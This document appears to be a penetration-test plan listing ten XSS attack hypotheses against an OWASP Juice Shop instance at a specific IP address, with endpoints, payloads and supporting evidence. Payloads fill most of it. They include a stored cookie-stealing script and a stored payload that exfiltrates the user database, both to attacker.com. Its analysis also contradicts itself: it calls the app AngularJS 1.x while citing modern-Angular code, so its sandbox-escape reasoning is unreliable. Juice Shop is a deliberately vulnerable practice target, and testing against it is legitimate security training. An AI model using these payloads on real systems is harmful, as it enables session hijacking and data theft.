# XSS Attack Hypotheses for OWASP Juice Shop

## Target Analysis
- **Target:** http://54.146.141.88:3000
- **Frontend:** Angular (AngularJS 1.x based on template injection patterns)
- **Sanitizer:** sanitize-html 1.4.2 (vulnerable to multiple XSS bypasses)
- **Key Vulnerability:** bypassSecurityTrustHtml usage bypasses Angular's built-in XSS protection

## Hypotheses

### Hypothesis 1
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q (reflected in search results via bypassSecurityTrustHtml)
**Payload:** `<img src=x onerror=alert('XSS-Search-Reflected')>`
**Expected Result:** JavaScript alert executes when search results are displayed, demonstrating reflected XSS
**Evidence from recon:** Search endpoint at routes/search.ts reflects query parameter in DOM via `this.sanitizer.bypassSecurityTrustHtml(queryParam)` in search-result.component.ts:171, explicitly bypassing Angular's XSS protection

### Hypothesis 2
**Endpoint:** POST /api/Feedbacks
**Parameter:** comment (JSON body field)
**Payload:** `<svg onload=alert('XSS-Stored-Feedback')>`
**Expected Result:** Script executes when admin views feedback on administration panel, demonstrating stored XSS
**Evidence from recon:** Feedback comment field is processed via `feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)` in administration.component.ts:78, bypassing all XSS protection for admin panel display

### Hypothesis 3
**Endpoint:** GET /#/search?q=
**Parameter:** q (DOM-based via Angular template binding)
**Payload:** `{{constructor.constructor('alert("XSS-DOM-Angular")')()}}`
**Expected Result:** Angular template injection executes JavaScript through sandbox escape, demonstrating DOM-based XSS
**Evidence from recon:** Angular 1.x template rendering identified, vulnerable to sandbox escapes. Search parameter flows through client-side routing and template rendering without server-side sanitization

### Hypothesis 4
**Endpoint:** Product details page via product description
**Parameter:** description field in product data
**Payload:** `<iframe src="javascript:alert('XSS-Product-Description')"></iframe>`
**Expected Result:** JavaScript executes when product details are viewed via innerHTML binding
**Evidence from recon:** Product description rendered via `<div [innerHTML]="data.productData.description"></div>` in product-details.component.html:16 with no sanitization, allowing direct HTML injection

### Hypothesis 5
**Endpoint:** POST /api/Feedbacks
**Parameter:** comment (sanitize-html bypass)
**Payload:** `<<script>alert('XSS-Sanitizer-Bypass')<</script>/script>`
**Expected Result:** Nested tag confusion bypasses sanitize-html 1.4.2, executing JavaScript in admin panel
**Evidence from recon:** sanitize-html version 1.4.2 vulnerable to CVE-2016-1000237 (nested tag bypass) and CVE-2021-26539 (improper input validation). Even if sanitization occurs before bypassSecurityTrustHtml, version is exploitable

### Hypothesis 6
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q (Angular expression injection)
**Payload:** `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert("XSS-Angular-Eval")//')}}`
**Expected Result:** Advanced Angular 1.x sandbox escape executes via $eval, demonstrating template injection vulnerability
**Evidence from recon:** Angular template processing combined with bypassSecurityTrustHtml creates ideal conditions for expression injection. Payload leverages AngularJS 1.x prototype pollution for sandbox escape

### Hypothesis 7
**Endpoint:** URL fragment manipulation
**Parameter:** DOM location hash processing
**Payload:** `http://54.146.141.88:3000/#/search?q=<svg/onload=alert('XSS-Fragment')>`
**Expected Result:** Client-side JavaScript processes URL fragment, executing payload through DOM manipulation
**Evidence from recon:** Angular routing uses URL fragments, and search functionality reflects parameters client-side. No server-side sanitization of fragment-based parameters

### Hypothesis 8
**Endpoint:** POST /api/Users (user registration)
**Parameter:** email field
**Payload:** `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
**Expected Result:** If user data is displayed anywhere in admin interface, cookie theft occurs via stored XSS
**Evidence from recon:** User registration endpoint accepts email parameter. If admin views user data through similar bypassSecurityTrustHtml patterns, stored XSS is possible

### Hypothesis 9
**Endpoint:** POST /api/Complaints
**Parameter:** message field
**Payload:** `<img src=x onerror="fetch('/api/Users',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))">`
**Expected Result:** Admin viewing complaints triggers data exfiltration of user database via stored XSS
**Evidence from recon:** Complaints system likely uses similar bypassSecurityTrustHtml pattern for admin display. Payload leverages stored XSS for API data theft

### Hypothesis 10
**Endpoint:** GET error pages (via invalid requests)
**Parameter:** Error message reflection
**Payload:** `GET /nonexistent/<script>alert('XSS-Error')</script>`
**Expected Result:** Error page reflects malformed URL in response, executing JavaScript
**Evidence from recon:** Error response pattern identified showing HTML error pages. Express may reflect request paths in error responses without sanitization

## Payload Prioritization

1. **Angular Template Injection** (Hypotheses 3, 6) - Highest priority due to AngularJS 1.x sandbox vulnerabilities
2. **bypassSecurityTrustHtml Exploitation** (Hypotheses 1, 2) - Direct bypass of Angular XSS protection
3. **sanitize-html Bypass** (Hypothesis 5) - Exploits known CVEs in outdated sanitization library
4. **Stored XSS via User Input** (Hypotheses 2, 8, 9) - Persistent attacks through data storage
5. **DOM-based XSS** (Hypothesis 7) - Client-side vulnerabilities through URL manipulation

## Attack Vectors Summary

- **Reflected XSS:** Search parameter, error pages
- **Stored XSS:** Feedback comments, user registration, complaints
- **DOM-based XSS:** Angular template injection, URL fragment processing
- **Sanitization Bypass:** Nested tags, Angular expression injection
- **Data Exfiltration:** Cookie theft, API data extraction via XSS